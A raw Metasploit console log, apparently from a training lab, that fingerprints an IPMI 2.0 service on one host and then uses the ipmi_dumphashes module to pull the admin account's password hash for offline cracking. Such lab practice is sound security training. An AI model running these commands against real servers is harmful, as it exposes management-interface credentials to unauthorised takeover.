
```
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.202.5
rhosts => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.129.202.5->10.129.202.5 (1 hosts)
[+] 10.129.202.5:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options

Module options (auxiliary/scanner/ipmi/ipmi_version):


```



```
msf6 auxiliary(scanner/ipmi/ipmi_version) > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.202.5
rhosts => 10.129.202.5
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting               Required  Description
   ----                  ---------------               --------  -----------
   CRACK_COMMON          true                          yes       Automatically crack common passwords as they are
                                                                  obtained
   OUTPUT_HASHCAT_FILE                                 no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                    no        Save captured password hashes in john the ripper
                                                                  format
   PASS_FILE             /opt/metasploit/data/wordlis  yes       File containing common passwords for offline cra
                         ts/ipmi_passwords.txt                   cking, one per line
   RHOSTS                10.129.202.5                  yes       The target host(s), see https://docs.metasploit.
                                                                 com/docs/using-metasploit/basics/using-metasploi
                                                                 t.html
   RPORT                 623                           yes       The target port
   SESSION_MAX_ATTEMPTS  5                             yes       Maximum number of session retries, required on c
                                                                 ertain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                             yes       Delay between session retries in seconds
   THREADS               1                             yes       The number of concurrent threads (max one per ho
                                                                 st)
   USER_FILE             /opt/metasploit/data/wordlis  yes       File containing usernames, one per line
                         ts/ipmi_users.txt


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.202.5:623 - IPMI - Hash found: admin:35d5f6b182000000f4a6b108c45d9e50823c63bd7eb6856a46bdae489be2396199e761fd6d8823b2a123456789abcdefa123456789abcdef140561646d696e:3df716c3b7f28e0bc0c7f62b3e53b7c35d8a5417
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
